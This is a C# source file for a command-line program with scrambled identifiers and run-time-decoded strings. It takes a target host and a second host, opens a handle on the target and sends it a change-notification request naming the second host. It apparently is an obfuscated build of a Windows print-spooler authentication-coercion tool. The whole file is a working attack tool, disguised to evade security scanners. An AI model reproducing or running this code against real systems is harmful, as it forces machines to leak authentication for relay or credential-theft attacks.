﻿using System;
using static AdeSticKnic.KingPorousEnce;
using System.Linq;

namespace AdeSticKnic
{
    internal class BreappentPhorumSemia
    {
        private static void Main(string[] KolidryGeomeLea)
        {
            if (KolidryGeomeLea.Length < 2)
            {
                Console.WriteLine(MaticalAginglosBroma.RefyingRelTimides.PursticCourglyPhotomy("e9m/ZG6c}mw.c.qq54wL//ZwAZFZ6<4mw/ZY6yv>6<rL9YZIZw6yv>"));
                Console.WriteLine(MaticalAginglosBroma.RefyingRelTimides.PursticCourglyPhotomy("e9m/ZG6c}mw.c.qq54wL//ZwAZFZ6hQgAhlKAhAhs6hQgAhlKAhAgOs"));
                return;
            }

            if (IntPtr.Size == 8)
            {
                Console.WriteLine(MaticalAginglosBroma.RefyingRelTimides.PursticCourglyPhotomy("[7wW5LZIYWm55gFl8"));
            }
            else
            {
                Console.WriteLine(MaticalAginglosBroma.RefyingRelTimides.PursticCourglyPhotomy("Wm55[7wW5LZIYWm55gFKl"));
            }

            var FessBeknowthRest = new RevingSucractedAles();
            IntPtr UndernChringJulates = IntPtr.Zero;
            var AsporioFrumblingSupers = new SynottiesUnerUness();
            try
            {
                var OvertedAmpmasBrace = FessBeknowthRest.GekhetParaCive(MaticalAginglosBroma.RefyingRelTimides.PursticCourglyPhotomy("\\\\") + KolidryGeomeLea[0], out UndernChringJulates, null, ref AsporioFrumblingSupers, 0);
                if (OvertedAmpmasBrace != 0)
                {
                    Console.WriteLine(System.String.Format(MaticalAginglosBroma.RefyingRelTimides.PursticCourglyPhotomy("30NB._J.ZIvwLIYZw69YmYe9G6(sV"), OvertedAmpmasBrace));
                    return;
                }

                OvertedAmpmasBrace = FessBeknowthRest.TumanMyelodalAss(UndernChringJulates, 0x00000100, 0, MaticalAginglosBroma.RefyingRelTimides.PursticCourglyPhotomy("\\\\") + KolidryGeomeLea[1], 0);
                if (OvertedAmpmasBrace != 0)
                {
                    Console.WriteLine(System.String.Format(MaticalAginglosBroma.RefyingRelTimides.PursticCourglyPhotomy("30NB._BZHqYZzLI7zLw9YvwLIYZwW}mI/Z[qYLbL_mYLqITF69YmYe9G6(sV"), OvertedAmpmasBrace));
                    return;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
            }
            finally
            {
                if (UndernChringJulates != IntPtr.Zero)
                    FessBeknowthRest.DishedHyllowkUntoir(ref UndernChringJulates);
            }
        }
    }
}